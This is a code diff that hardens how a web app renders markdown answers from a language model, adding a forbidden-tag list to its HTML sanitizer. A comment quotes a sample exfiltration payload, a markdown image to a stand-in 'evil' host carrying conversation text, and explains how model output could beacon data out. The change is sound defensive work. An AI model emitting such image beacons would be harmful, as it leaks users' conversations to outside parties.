@@ -470,13 +470,16 @@ const phosphorPathMarkup = (name) => `<path d="${PHOSPHOR_PATHS[name] || ''}"/>`
         // literal, not window.ShelahActions.ATTRIBUTES: that script loads
         // after this one. tests/test_inline_handlers.py keeps the two equal.
         const ACTION_ATTRIBUTES = ['data-onclick', 'data-onclick-arg', 'data-onclick-encoding', 'data-oninput'];
+        // CSP allows img-src https:, so a model-emitted ![](https://evil/?q=...)
+        // would beacon conversation text out. Answers are prose; no embeds/forms.
+        const ANSWER_FORBIDDEN_TAGS = ['img', 'picture', 'source', 'video', 'audio', 'form', 'input', 'textarea', 'button', 'select', 'style', 'link', 'meta', 'iframe', 'object', 'embed', 'svg', 'math'];
 
         function renderAnswerMarkdown(answerText) {
             const raw = normalizeMarkdownSpacing(String(answerText || 'No synthesis available.'));
             if (window.marked && typeof window.marked.parse === 'function') {
                 const html = marked.parse(raw);
                 return (window.DOMPurify && typeof window.DOMPurify.sanitize === 'function')
-                    ? DOMPurify.sanitize(html, { USE_PROFILES: { html: true }, FORBID_ATTR: ACTION_ATTRIBUTES })
+                    ? DOMPurify.sanitize(html, { USE_PROFILES: { html: true }, FORBID_ATTR: ACTION_ATTRIBUTES, FORBID_TAGS: ANSWER_FORBIDDEN_TAGS })
                     : html;
             }
 
